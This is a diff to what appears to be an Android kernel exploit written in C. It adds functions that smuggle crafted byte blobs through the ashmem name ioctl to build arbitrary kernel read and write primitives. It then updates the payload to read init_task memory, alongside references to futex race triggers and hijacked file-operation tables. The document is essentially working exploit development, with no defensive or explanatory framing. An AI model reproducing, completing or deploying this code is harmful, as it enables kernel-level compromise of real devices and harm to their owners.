@@ -17,6 +17,65 @@ extern int trigger_futex_race(void);
 extern int ghost_write_global(uint64_t target, uint64_t value);
 extern int phase2_bridge_diag(void);
 
+/* Wire configfs ARW primitives via ashmem_area name overlay */
+static int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
+    char name[ASHMEM_NAME_LEN];
+    memset(name, 0x41, sizeof(name));
+    for (size_t i = 0; i < len; i++) {
+        name[i] = blob[i] ? blob[i] : 1;
+    }
+    name[len] = 0;
+    return ioctl(fd, ASHMEM_SET_NAME, name);
+}
+
+static int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
+    char name[ASHMEM_NAME_LEN];
+    memset(name, 0x41, sizeof(name));
+    for (size_t i = 0; i < pos; i++) {
+        name[i] = blob[i] ? blob[i] : 1;
+    }
+    name[pos] = 0;
+    return ioctl(fd, ASHMEM_SET_NAME, name);
+}
+
+static int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
+    if (try_put_blob_no_zeros(fd, blob, len) != 0) return -1;
+    for (size_t i = len; i > 0; i--) {
+        if (blob[i - 1] == 0 && try_put_blob_zero_at(fd, blob, i - 1) != 0) {
+            return -1;
+        }
+    }
+    return 0;
+}
+
+static ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
+    unsigned char blob[128];
+    memset(blob, 0, sizeof(blob));
+    off_t pos = (off_t)(target & 0xffffffULL);
+    uintptr_t page = target - (uintptr_t)pos;
+    memcpy(blob + 16, &page, sizeof(page));
+    int fill = 0;
+    memcpy(blob + 80, &fill, sizeof(fill));
+    errno = 0;
+    if (try_set_ashmem_name_blob(fd, blob, sizeof(blob)) != 0) return -1;
+    return pread(fd, data, len, pos);
+}
+
+static ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
+    unsigned char blob[128];
+    memset(blob, 0, sizeof(blob));
+    off_t pos = (off_t)(target & 0xffffffULL);
+    uintptr_t aligned = target - (uintptr_t)pos;
+    uint32_t buf_sz = (uint32_t)((uint64_t)pos + len);
+    uint32_t max_sz = 0;
+    memcpy(blob + CFG_BIN_BUFFER_OFF, &aligned, sizeof(aligned));
+    memcpy(blob + CFG_BIN_BUFFER_SIZE_OFF, &buf_sz, sizeof(buf_sz));
+    memcpy(blob + CFG_CB_MAX_SIZE_OFF, &max_sz, sizeof(max_sz));
+    errno = 0;
+    if (try_set_ashmem_name_blob(fd, blob, sizeof(blob)) != 0) return -1;
+    return pwrite(fd, data, len, pos);
+}
+
 static void run_worker_payload(void) {
     /* 1. Drop privileges to Android shell user (UID 2000, GID 2000) */
     if (setresgid(2000, 2000, 2000) != 0) {
@@ -74,16 +133,18 @@ static void run_worker_payload(void) {
         fflush(stdout);
 
         /* Reopen /dev/ashmem and verify read/write trigger configfs primitive */
-        printf("[*] Reopening /dev/ashmem to verify patched ashmem_fops...\n");
+        printf("[*] Reopening /dev/ashmem to verify ARW primitives...\n");
         int ash_fd = open("/dev/ashmem", O_RDWR);
         if (ash_fd >= 0) {
-            printf("[+] Reopen /dev/ashmem succeeded (fd=%d) with in-place patched table!\n", ash_fd);
-            /* Test write through hijacked write_iter */
-            char test_buf[8] = "test";
+            printf("[+] Reopen /dev/ashmem succeeded (fd=%d)!\n", ash_fd);
+            
+            /* Test arbitrary kernel read of init_task comm or stack */
+            uint64_t init_task_val = 0;
             errno = 0;
-            ssize_t wr_ret = write(ash_fd, test_buf, sizeof(test_buf));
-            printf("[*] Ashmem write with hijacked write_iter: ret=%zd errno=%d (%s)\n",
-                   wr_ret, errno, strerror(errno));
+            ssize_t rd_ret = configfs_read_once(ash_fd, (uintptr_t)ADDR_INIT_TASK, &init_task_val, sizeof(init_task_val));
+            printf("[*] Configfs kernel read test (target=0x%llx): ret=%zd val=0x%016llx errno=%d\n",
+                   (unsigned long long)ADDR_INIT_TASK, rd_ret, (unsigned long long)init_task_val, errno);
+
             close(ash_fd);
         } else {
             printf("[-] Reopen /dev/ashmem failed errno=%d (%s)\n", errno, strerror(errno));
